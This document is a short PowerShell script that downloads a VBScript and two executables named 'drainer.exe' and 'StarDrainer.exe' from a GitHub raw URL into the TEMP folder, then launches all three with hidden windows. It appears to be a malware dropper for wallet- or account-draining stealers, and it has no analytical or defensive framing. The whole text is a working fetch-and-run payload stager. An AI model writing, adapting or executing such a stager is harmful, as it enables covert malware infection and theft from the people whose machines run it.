$base = 'https://github.com/jesuss13377-source/456/raw/refs/heads/main/'
$vbs = "$env:TEMP\script.vbs"
$d1 = "$env:TEMP\drainer.exe"
$d2 = "$env:TEMP\StarDrainer.exe"

(New-Object Net.WebClient).DownloadFile($base + 'script.vbs', $vbs)
(New-Object Net.WebClient).DownloadFile($base + 'drainer.exe', $d1)
(New-Object Net.WebClient).DownloadFile($base + 'StarDrainer.exe', $d2)

Start-Process -FilePath 'wscript.exe' -ArgumentList "`"$vbs`"" -WindowStyle Hidden
Start-Process -FilePath $d1 -WindowStyle Hidden
Start-Process -FilePath $d2 -WindowStyle Hidden
